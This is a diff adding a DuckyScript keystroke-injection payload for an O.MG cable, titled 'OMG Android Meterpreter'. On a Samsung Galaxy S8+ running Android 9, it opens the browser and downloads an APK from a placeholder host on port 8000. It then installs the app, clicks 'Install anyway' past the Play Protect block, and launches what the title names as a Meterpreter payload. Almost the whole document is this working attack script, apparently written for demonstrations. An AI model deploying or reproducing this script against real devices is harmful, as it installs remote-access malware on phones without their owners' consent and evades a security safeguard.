@@ -1,0 +1,99 @@
+REM # -----------------------------------------------------------
+REM # Title: OMG Android Meterpreter
+REM # Description: Download and install an APK on Android. 
+REM # You may need to change the script for your particular phone
+REM # model and Android version. Play around with it. Delays are very
+REM # important and makes a really big difference. 
+REM # 
+REM # Author: David Bombal 
+REM # Target: Android 9 (Samsung Galaxy S8+)
+REM # Notes: Set URL for APK payload below
+REM # -----------------------------------------------------------
+
+REM # -----------------------------------------------------------
+REM # clear screen (Not needed, but helps for demos)
+REM # -----------------------------------------------------------
+
+GUI ENTER
+DELAY 1000
+GUI ENTER
+
+REM # -----------------------------------------------------------
+REM # launch browser and download apk
+REM # -----------------------------------------------------------
+
+GUI b
+DELAY 1000
+CTRL l
+DELAY 50
+STRING http://xxx.xxx.xxx.xxx:8000/omg.apk
+ENTER
+DELAY 4000
+
+REM # -----------------------------------------------------------
+REM # open apk with My Files
+REM # -----------------------------------------------------------
+
+GUI r
+DELAY 500
+ENTER
+DELAY 500
+TAB
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+CTRL f
+DOWN
+DOWN
+ENTER
+TAB
+ENTER
+DELAY 2000
+
+REM # -----------------------------------------------------------
+REM # Do you want to install MainActivity
+REM # -----------------------------------------------------------
+
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+TAB
+RIGHT
+ENTER
+
+REM # -----------------------------------------------------------
+REM # Blocked by Play Protect. Install anyway.
+REM # -----------------------------------------------------------
+
+DELAY 5000
+DOWN
+LEFT
+ENTER
+
+REM # -----------------------------------------------------------
+REM # Open application, after installation.
+REM # -----------------------------------------------------------
+
+DELAY 10000
+DOWN
+CTRL f
+TAB
+ENTER
+ENTER
+
+# REM Credit goes to _MG_, and DrewSec for the Android 11 and 12 versions which inspired this. 
